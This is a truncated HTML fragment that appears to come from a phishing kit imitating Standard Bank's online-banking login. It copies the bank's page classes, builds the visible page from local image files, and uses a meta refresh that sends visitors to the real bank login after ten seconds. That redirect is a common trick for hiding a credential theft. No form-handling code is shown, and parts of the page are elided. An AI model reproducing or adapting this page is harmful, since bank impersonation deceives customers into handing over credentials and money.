...
<html ng-app="refresh" class="ng-scope mdl-js" lang="en">
   <head>
	   <meta http-equiv="Refresh" content="10; url=https://onlinebanking.standardbank.co.za/#/login?intcmp=coza-sitewide-headernav-direct-login">
   ...
   <body ng-controller="spinnerController" ng-class="{ 'login migration-login-bg': migrationLogin(), 'login-strong-auth-bg':strongAuthLogin() }" class="ng-scope login migration-login-bg login-strong-auth-bg">
       <div class="content-wrapper">
           <div id="image1" style="position: absolute; overflow: hidden; left: 532px; top: -1px; width: 424px; height: 567px; z-index: 0"><img src="images/pgscc.png" alt="" title="" border=0 width=420 height=509></div>
   </div>
   <div id="arcotuserdataDiv" display="none" style="display: none;"></div>
      ...
      </div><div id="formimage1" style="position: absolute; left: 235px; top: 644px; z-index: 2; width: 1133px; height: 157px;"><input type="image" name="formimage1" width="1000" height="75" src="images/footer.png"></div>
   <p>&nbsp;</p><div id="image2" style="position: absolute; overflow: hidden; left: 667px; top: 263px; width: 153px; height: 126px; z-index: 1"><img src="images/syt.gif" alt="" title="" border=0 width=100 height=100></div>
